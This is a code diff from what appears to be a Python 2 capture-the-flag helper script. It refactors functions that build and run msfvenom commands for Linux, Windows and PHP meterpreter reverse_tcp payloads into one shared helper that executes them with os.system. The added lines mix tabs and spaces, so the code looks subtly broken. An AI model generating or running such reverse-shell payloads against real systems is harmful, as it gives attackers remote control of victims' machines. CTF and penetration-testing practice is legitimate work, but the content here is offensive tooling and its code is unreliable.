@@ -119,34 +119,27 @@ def perl_tty():
 
 #MSVENOM Linux
 def linux_msvenom():
-	os.system('clear')
-	print "Writing shell"
-	print "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > /root/ctf/shell.elf" % (IP_ADDR,PORT)
-	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > /root/ctf/shell.elf' % (IP_ADDR,PORT))
-	print "\nMake sure you use the right handler"
+	shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (IP_ADDR,PORT)
+        msfvenom(shellcode)
 
 #MSVENOM Windows
 def windows_msvenom():
-	#shellcode = msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
-	os.system('clear')
-	print "Writing shell"
-	print "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > /root/ctf/shell.elf" % (IP_ADDR,PORT)
-	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > /root/ctf/shell.exe' % (IP_ADDR,PORT))
-	print "\nMake sure you use the right handler"
+        shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" %(IP_ADDR,PORT)
+        msfvenom(shellcode)
 
 #MSVENOM PHP
 def php_msvenom():
-	#shellcode = msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
-	os.system('clear')
-	print "Writing shell"
-	print "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw > /root/ctf/shell.php" % (IP_ADDR,PORT)
-	os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw > /root/ctf/shell.php' % (IP_ADDR,PORT))
-	print "\nMake sure you use the right handler"
+	shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (IP_ADDR,PORT)
+        msfvenom(shellcode)
 
+def msfvenom(shellcode):
+        warning ="Make sure you are using the correct payload in MSFConsole"
+        os.system('clear')
+        print "Writing Shell"
+        print shellcode
+        os.system(shellcode)
+        print warning
 
-
-
- 	
 # =======================
 #    MENUS DEFINITIONS
 # =======================
